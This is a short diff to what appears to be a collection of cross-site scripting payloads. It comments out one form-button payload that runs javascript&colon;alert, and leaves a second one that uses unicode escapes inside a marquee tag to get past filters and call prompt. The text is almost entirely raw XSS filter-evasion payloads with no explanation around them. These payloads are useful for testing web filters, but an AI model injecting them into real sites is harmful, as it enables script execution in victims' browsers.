@@ -1,5 +1,5 @@
 
-<form><button formaction=javascript&colon;alert('xss_by_Y000!')>_Y000!_
+##<form><button formaction=javascript&colon;alert('xss_by_Y000!')>_Y000!_
 
 
 <marquee><form><button formacti\u006fn=javascript&colon;pr\u006fmpt('xss_by_Y000!')>_Y000!_</marquee>
